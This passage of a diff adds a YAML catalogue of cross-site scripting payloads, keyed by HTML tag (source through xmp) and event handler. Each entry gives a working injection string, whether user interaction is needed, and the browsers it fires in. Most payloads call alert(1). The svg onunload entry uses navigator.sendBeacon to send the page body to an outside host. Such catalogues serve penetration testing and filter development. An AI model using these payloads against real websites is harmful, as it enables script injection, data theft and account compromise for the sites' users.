+    - <source id=x tabindex=1 onfocus=alert(1)></source>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <source id=x tabindex=1 onfocusin=alert(1)></source>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <source onpaste="alert(1)" contenteditable>test</source>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+spacer:
+  onbeforecopy:
+    payloads:
+    - <spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <spacer onbeforecut="alert(1)" contenteditable>test</spacer>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <spacer id=x tabindex=1 onfocus=alert(1)></spacer>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <spacer onpaste="alert(1)" contenteditable>test</spacer>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+span:
+  onbeforecopy:
+    payloads:
+    - <span onbeforecopy="alert(1)" contenteditable>test</span>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <span onbeforecut="alert(1)" contenteditable>test</span>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <span id=x tabindex=1 onfocus=alert(1)></span>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <span id=x tabindex=1 onfocusin=alert(1)></span>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <span onpaste="alert(1)" contenteditable>test</span>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+strike:
+  onbeforecopy:
+    payloads:
+    - <strike onbeforecopy="alert(1)" contenteditable>test</strike>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <strike onbeforecut="alert(1)" contenteditable>test</strike>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <strike id=x tabindex=1 onfocus=alert(1)></strike>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <strike id=x tabindex=1 onfocusin=alert(1)></strike>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <strike onpaste="alert(1)" contenteditable>test</strike>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+strong:
+  onbeforecopy:
+    payloads:
+    - <strong onbeforecopy="alert(1)" contenteditable>test</strong>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <strong onbeforecut="alert(1)" contenteditable>test</strong>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <strong id=x tabindex=1 onfocus=alert(1)></strong>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <strong id=x tabindex=1 onfocusin=alert(1)></strong>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <strong onpaste="alert(1)" contenteditable>test</strong>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+style:
+  onbeforecopy:
+    payloads:
+    - <style onbeforecopy="alert(1)" contenteditable style=display:block>test</style>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <style onbeforecut="alert(1)" contenteditable style=display:block>test</style>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <style id=x tabindex=1 onfocus=alert(1) style=display:block></style>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <style id=x tabindex=1 onfocusin=alert(1) style=display:block></style>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <style onload=alert(1)></style>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <style onpaste="alert(1)" contenteditable style=display:block style=display:block>test</style>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+sub:
+  onbeforecopy:
+    payloads:
+    - <sub onbeforecopy="alert(1)" contenteditable>test</sub>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <sub onbeforecut="alert(1)" contenteditable>test</sub>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <sub id=x tabindex=1 onfocus=alert(1)></sub>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <sub id=x tabindex=1 onfocusin=alert(1)></sub>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <sub onpaste="alert(1)" contenteditable>test</sub>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+summary:
+  onbeforecopy:
+    payloads:
+    - <summary onbeforecopy="alert(1)" contenteditable>test</summary>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <summary onbeforecut="alert(1)" contenteditable>test</summary>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <summary id=x tabindex=1 onfocus=alert(1)></summary>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <summary id=x tabindex=1 onfocusin=alert(1)></summary>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <summary onpaste="alert(1)" contenteditable>test</summary>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+sup:
+  onbeforecopy:
+    payloads:
+    - <sup onbeforecopy="alert(1)" contenteditable>test</sup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <sup onbeforecut="alert(1)" contenteditable>test</sup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <sup id=x tabindex=1 onfocus=alert(1)></sup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <sup id=x tabindex=1 onfocusin=alert(1)></sup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <sup onpaste="alert(1)" contenteditable>test</sup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+svg:
+  onbeforecopy:
+    payloads:
+    - <svg onbeforecopy="alert(1)" contenteditable>test</svg>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <svg onbeforecut="alert(1)" contenteditable>test</svg>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <svg id=x onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <svg id=x onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <svg onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <svg onpaste="alert(1)" contenteditable>test</svg>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onunload:
+    payloads:
+    - <svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+table:
+  onbeforecopy:
+    payloads:
+    - <table onbeforecopy="alert(1)" contenteditable>test</table>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <table onbeforecut="alert(1)" contenteditable>test</table>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <table id=x tabindex=1 onfocus=alert(1)></table>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <table id=x tabindex=1 onfocusin=alert(1)></table>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <table onpaste="alert(1)" contenteditable>test</table>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+tbody:
+  onbeforecopy:
+    payloads:
+    - <tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <tbody onbeforecut="alert(1)" contenteditable>test</tbody>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <tbody id=x tabindex=1 onfocus=alert(1)></tbody>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <tbody onpaste="alert(1)" contenteditable>test</tbody>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+td:
+  onbeforecopy:
+    payloads:
+    - <td onbeforecopy="alert(1)" contenteditable>test</td>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <td onbeforecut="alert(1)" contenteditable>test</td>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <td id=x tabindex=1 onfocus=alert(1)></td>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <td id=x tabindex=1 onfocusin=alert(1)></td>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <td onpaste="alert(1)" contenteditable>test</td>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+template:
+  onbeforecopy:
+    payloads:
+    - <template onbeforecopy="alert(1)" contenteditable>test</template>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <template onbeforecut="alert(1)" contenteditable>test</template>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <template id=x tabindex=1 onfocus=alert(1)></template>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <template id=x tabindex=1 onfocusin=alert(1)></template>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <template onpaste="alert(1)" contenteditable>test</template>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+textarea:
+  onauxclick:
+    payloads:
+    - <textarea onauxclick=alert(1)>XSS</textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+  onbeforecopy:
+    payloads:
+    - <textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <textarea onbeforecut=alert(1) autofocus>XSS</textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onchange:
+    payloads:
+    - <textarea onchange=alert(1)>XSS</textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <textarea autofocus onfocus=alert(1)>test</textarea>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocusin:
+    payloads:
+    - <textarea autofocus onfocusin=alert(1)>test</textarea>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oninput:
+    payloads:
+    - <textarea oninput=alert(1)>XSS</textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oninvalid:
+    payloads:
+    - <form><textarea oninvalid=alert(1) required><input type=submit>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <textarea onpaste=alert(1) autofocus></textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onselect:
+    payloads:
+    - <textarea onselect=alert(1) autofocus>XSS</textarea>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+tfoot:
+  onbeforecopy:
+    payloads:
+    - <tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <tfoot onpaste="alert(1)" contenteditable>test</tfoot>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+th:
+  onbeforecopy:
+    payloads:
+    - <th onbeforecopy="alert(1)" contenteditable>test</th>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <th onbeforecut="alert(1)" contenteditable>test</th>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <th id=x tabindex=1 onfocus=alert(1)></th>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <th id=x tabindex=1 onfocusin=alert(1)></th>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <th onpaste="alert(1)" contenteditable>test</th>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+thead:
+  onbeforecopy:
+    payloads:
+    - <thead onbeforecopy="alert(1)" contenteditable>test</thead>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <thead onbeforecut="alert(1)" contenteditable>test</thead>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <thead id=x tabindex=1 onfocus=alert(1)></thead>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <thead id=x tabindex=1 onfocusin=alert(1)></thead>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <thead onpaste="alert(1)" contenteditable>test</thead>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+time:
+  onbeforecopy:
+    payloads:
+    - <time onbeforecopy="alert(1)" contenteditable>test</time>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <time onbeforecut="alert(1)" contenteditable>test</time>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <time id=x tabindex=1 onfocus=alert(1)></time>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <time id=x tabindex=1 onfocusin=alert(1)></time>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <time onpaste="alert(1)" contenteditable>test</time>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+title:
+  onbeforecopy:
+    payloads:
+    - <title onbeforecopy="alert(1)" contenteditable>test</title>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <title onbeforecut="alert(1)" contenteditable>test</title>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <title id=x tabindex=1 onfocus=alert(1)></title>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <title id=x tabindex=1 onfocusin=alert(1)></title>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <title onpaste="alert(1)" contenteditable>test</title>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+tr:
+  onbeforecopy:
+    payloads:
+    - <tr onbeforecopy="alert(1)" contenteditable>test</tr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <tr onbeforecut="alert(1)" contenteditable>test</tr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <tr id=x tabindex=1 onfocus=alert(1)></tr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <tr id=x tabindex=1 onfocusin=alert(1)></tr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <tr onpaste="alert(1)" contenteditable>test</tr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+track:
+  onbeforecopy:
+    payloads:
+    - <track onbeforecopy="alert(1)" contenteditable>test</track>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <track onbeforecut="alert(1)" contenteditable>test</track>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncuechange:
+    payloads:
+    - "<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1)
+      src=\"data:text/vtt,WEBVTT FILE\n\n1\n00:00:00.000 --> 00:00:05.000 \n<b>XSS</b>\n\"></video>"
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocus:
+    payloads:
+    - <track id=x tabindex=1 onfocus=alert(1)></track>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <track id=x tabindex=1 onfocusin=alert(1)></track>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <track onpaste="alert(1)" contenteditable>test</track>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+tt:
+  onbeforecopy:
+    payloads:
+    - <tt onbeforecopy="alert(1)" contenteditable>test</tt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <tt onbeforecut="alert(1)" contenteditable>test</tt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <tt id=x tabindex=1 onfocus=alert(1)></tt>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <tt id=x tabindex=1 onfocusin=alert(1)></tt>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <tt onpaste="alert(1)" contenteditable>test</tt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+u:
+  onbeforecopy:
+    payloads:
+    - <u onbeforecopy="alert(1)" contenteditable>test</u>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <u onbeforecut="alert(1)" contenteditable>test</u>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <u id=x tabindex=1 onfocus=alert(1)></u>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <u id=x tabindex=1 onfocusin=alert(1)></u>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <u onpaste="alert(1)" contenteditable>test</u>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+ul:
+  onbeforecopy:
+    payloads:
+    - <ul onbeforecopy="alert(1)" contenteditable>test</ul>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <ul onbeforecut="alert(1)" contenteditable>test</ul>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <ul id=x tabindex=1 onfocus=alert(1)></ul>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <ul id=x tabindex=1 onfocusin=alert(1)></ul>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <ul onpaste="alert(1)" contenteditable>test</ul>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+var:
+  onbeforecopy:
+    payloads:
+    - <var onbeforecopy="alert(1)" contenteditable>test</var>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <var onbeforecut="alert(1)" contenteditable>test</var>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <var id=x tabindex=1 onfocus=alert(1)></var>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <var id=x tabindex=1 onfocusin=alert(1)></var>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <var onpaste="alert(1)" contenteditable>test</var>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+video:
+  onbeforecopy:
+    payloads:
+    - <video onbeforecopy="alert(1)" contenteditable>test</video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <video onbeforecut="alert(1)" contenteditable>test</video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncanplay:
+    payloads:
+    - <video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oncanplaythrough:
+    payloads:
+    - <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ondurationchange:
+    payloads:
+    - <video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onended:
+    payloads:
+    - <video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <video src/onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfullscreenchange:
+    payloads:
+    - <video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
+    required: []
+    interaction: true
+    browsers:
+    - firefox
+  onloadeddata:
+    payloads:
+    - <video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadedmetadata:
+    payloads:
+    - <video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onmozfullscreenchange:
+    payloads:
+    - <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
+    required: []
+    interaction: true
+    browsers:
+    - firefox
+  onpaste:
+    payloads:
+    - <video onpaste="alert(1)" contenteditable>test</video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpause:
+    payloads:
+    - <video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onplay:
+    payloads:
+    - <video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onplaying:
+    payloads:
+    - <video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onprogress:
+    payloads:
+    - <video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onseeked:
+    payloads:
+    - <video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onseeking:
+    payloads:
+    - <video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  ontimeupdate:
+    payloads:
+    - <video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4"
+      type="video/mp4"></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onvolumechange:
+    payloads:
+    - <video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4"
+      type="video/mp4"></video>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+video2:
+  onfocus:
+    payloads:
+    - <video controls src=1 onfocus=alert(1) autofocus>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocusin:
+    payloads:
+    - <video controls src=1 onfocusin=alert(1) autofocus>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+wbr:
+  onbeforecopy:
+    payloads:
+    - <wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <wbr onbeforecut="alert(1)" contenteditable>test</wbr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <wbr id=x tabindex=1 onfocus=alert(1)></wbr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <wbr onpaste="alert(1)" contenteditable>test</wbr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+xmp:
+  onbeforecopy:
+    payloads:
+    - <xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <xmp onbeforecut="alert(1)" contenteditable>test</xmp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <xmp id=x tabindex=1 onfocus=alert(1)></xmp>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <xmp onpaste="alert(1)" contenteditable>test</xmp>
+    required: []
+    interaction: true
+    browsers:
